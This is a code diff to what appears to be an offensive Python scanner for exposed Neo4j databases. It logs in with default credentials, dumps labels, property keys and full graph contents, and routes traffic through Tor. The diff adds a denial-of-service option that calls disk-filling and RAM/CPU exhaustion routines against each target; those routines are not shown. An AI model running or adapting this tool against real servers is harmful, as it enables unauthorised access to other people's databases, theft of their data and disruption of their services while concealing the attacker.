@@ -97,9 +97,6 @@ def analyzeIP_Orient(ip,args):
 def analyzeIP_Neo4j(ip,args):
 	try:
 		data_report = {}
-		if args.tor == True:
-		    socks.setdefaultproxy(proxy_type=socks.PROXY_TYPE_SOCKS5, addr="127.0.0.1", port=9050)
-		    socket.socket = socks.socksocket
 		url = "http://"+ip+":7474/db/data"
 		r = requests.get(url,auth=('neo4j', ''),timeout=1 )
 		if r.status_code == 200:
@@ -128,8 +125,8 @@ def analyzeIP_Neo4j(ip,args):
 			url_props = "http://" + ip + ":7474/db/data/propertykeys"
 			data_report['labels'] = requests.get(url_labels,auth=('neo4j', ''),timeout=1 ).json()
 			data_report['types'] = requests.get(url_types,auth=('neo4j', ''),timeout=1 ).json()
-	    		data_report['props'] = requests.get(url_props,auth=('neo4j', ''),timeout=1 ).json()
-
+	    		data_report['props'] = requests.get(url_props,auth=('neo4j', ''),timeout=1 ).json()			
+					
 			''' Query to get some data of the graph database '''
 			url_query = "http://" + ip + ":7474/db/data/transaction/commit";
 			if args.limit == False:
@@ -137,7 +134,16 @@ def analyzeIP_Neo4j(ip,args):
 			else:
 				data_report['info'] = requests.post(url_query,json={'statements': [{'resultDataContents':['row'], 'statement':'MATCH (n)-[r]-(m) RETURN n,r,m '}]},headers=headers).json()
 
-
+			''' DoS to the Neo4j '''
+			if args.DoS == True:
+				try:
+					dos_disco1(ip,url_query,url_labels,url_props,headers)
+					dos_disco2(ip,url_query,headers)
+					dos_RamCpu(ip,url_query,headers)
+					
+				except Exception as e:
+					print "Error en la denegacion"
+					
 			''' Part of a cluster '''
 			url_cluster_avalaible = "http://" + ip + ":7474/db/manage/server/ha/available"
 			cluster_response = requests.get(url_cluster_avalaible,headers=headers,timeout=1)
@@ -263,6 +269,9 @@ def main():
 	banner()
 	results = []
 	args = getArguments(sys.argv)
+	if args.tor == True:
+		    socks.setdefaultproxy(proxy_type=socks.PROXY_TYPE_SOCKS5, addr="127.0.0.1", port=9050)
+		    socket.socket = socks.socksocket
 	for ip in args.listIps:
 		if args.neo4j:
 			data = analyzeIP_Neo4j(str(ip),args)
